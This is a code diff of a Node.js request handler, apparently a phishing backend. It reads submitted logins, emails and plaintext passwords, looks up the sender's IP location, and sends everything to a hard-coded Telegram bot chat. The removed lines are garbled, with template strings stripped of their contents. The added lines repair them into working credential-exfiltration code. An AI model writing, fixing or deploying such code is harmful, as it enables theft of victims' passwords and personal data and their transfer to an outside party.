@@ -9,12 +9,12 @@ const CHAT_ID = process.env.CHAT_ID || '-1004328186753';
 
 function sendTelegram(text) {
   if (!CHAT_ID) return Promise.resolve();
-  const payload = JSON.stringify({ chat_id: CHAT_ID, text, disable_web_page_preview: true });
+  const payload = JSON.stringify({ chat_id: CHAT_ID, text: text, disable_web_page_preview: true });
   return new Promise((resolve, reject) => {
     const req = https.request(
       {
         hostname: 'api.telegram.org',
-        path: /bot/sendMessage,
+        path: '/bot' + BOT_TOKEN + '/sendMessage',
         method: 'POST',
         headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(payload) },
       },
@@ -48,7 +48,7 @@ module.exports = async (req, res) => {
 
   let body = req.body;
   if (typeof body === 'string') {
-    try { body = JSON.parse(body); } catch { body = {}; }
+    try { body = JSON.parse(body); } catch (e) { body = {}; }
   }
   if (!body) body = {};
 
@@ -58,17 +58,17 @@ module.exports = async (req, res) => {
 
   let location = body.location || 'unknown';
   if (city && country) {
-    location = ${city}, ;
+    location = city + ', ' + country;
   } else if (country) {
     location = country;
   } else if (ip && ip !== 'unknown' && !ip.startsWith('127.') && !ip.startsWith('192.168')) {
     try {
       const controller = new AbortController();
       setTimeout(() => controller.abort(), 3000);
-      const r = await fetch(http://ip-api.com/json/?fields=city,country, { signal: controller.signal });
+      const r = await fetch('http://ip-api.com/json/' + ip + '?fields=city,country', { signal: controller.signal });
       const j = await r.json();
-      if (j && j.country) location = ${j.city ? j.city + ', ' : ''};
-    } catch {}
+      if (j && j.country) location = (j.city ? j.city + ', ' : '') + j.country;
+    } catch (e) {}
   }
 
   const login = body.login || body.username || 'N/A';
@@ -76,14 +76,14 @@ module.exports = async (req, res) => {
   const pass = body.pass || body.password || 'N/A';
 
   const text =
-    📝 NEW REGISTRATION (DB)\n +
-    -------------------\n +
-    👤 Login: \n +
-    📧 Email: \n +
-    🔐 Pass: \n +
-    -------------------\n +
-    🌍 IP: \n +
-    🏳️ Location: ;
+    '📝 NEW REGISTRATION (DB)\n' +
+    '-------------------\n' +
+    '👤 Login: ' + login + '\n' +
+    '📧 Email: ' + email + '\n' +
+    '🔐 Pass: ' + pass + '\n' +
+    '-------------------\n' +
+    '🌍 IP: ' + ip + '\n' +
+    '🏳️ Location: ' + location;
 
   try {
     await sendTelegram(text);
